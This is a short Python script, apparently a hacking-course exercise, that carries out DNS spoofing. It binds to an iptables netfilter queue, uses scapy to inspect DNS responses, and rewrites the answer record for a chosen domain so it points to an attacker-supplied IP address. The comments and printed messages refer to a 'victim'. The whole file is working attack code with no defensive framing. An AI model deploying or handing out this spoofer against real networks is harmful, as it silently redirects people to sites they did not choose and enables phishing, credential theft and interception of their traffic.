import netfilterqueue
import scapy.all as scapy
import optparse

def getArguments():
    parser = optparse.OptionParser()
    parser.add_option('-d', '--domain', dest= 'domain', help= 'Target domain name (e.g. www.domain.com)')
    parser.add_option('-r', '--redirectip', dest= 'redirectIp', help= 'ip of the destination web site where redirect will be done')
    parser.add_option('-q', '--queue-num', dest= 'queueNum', help= 'Queue number (The same as iptables queue number)')
    (options, arguments) = parser.parse_args()
    return options

def processPacket(packet):
    scapyPacket = scapy.IP(packet.get_payload())
    
    # Filter all the packets of DNS Response Record
    if scapyPacket.haslayer(scapy.DNSRR):
        qname = scapyPacket[scapy.DNSQR].qname # Get the domain name to which the victim has entered
        
        # If victim has entered to target domain, DNS spoof will be done
        if options.domain in str(qname):
            print(f'\r[+] Victim has entered to {options.domain}\n[+] Stating spoofing...\n', end= '')  

            # To redirect, we have to modify 'rrname' and 'rdata' into 'DNS Resource Record'
            answer = scapy.DNSRR(rrname= qname, rdata= options.redirectIp)
            scapyPacket[scapy.DNS].an = answer 
            scapyPacket[scapy.DNS].ancount = 1 # Set answer count to 1
            
            del scapyPacket[scapy.IP].len
            del scapyPacket[scapy.IP].chksum
            del scapyPacket[scapy.UDP].len
            del scapyPacket[scapy.UDP].chksum
            # Replace original packet with modified packet to which we've done the changes (current)
            packet.set_payload(bytes(scapyPacket))

    packet.accept()

options = getArguments()
queue = netfilterqueue.NetfilterQueue()
queue.bind(int(options.queueNum), processPacket)

try:        
    print(f'Starting program\nWaiting for victim get into {options.domain}...')
    queue.run()

except KeyboardInterrupt:
    print('\nProgram finished')

queue.unbind()
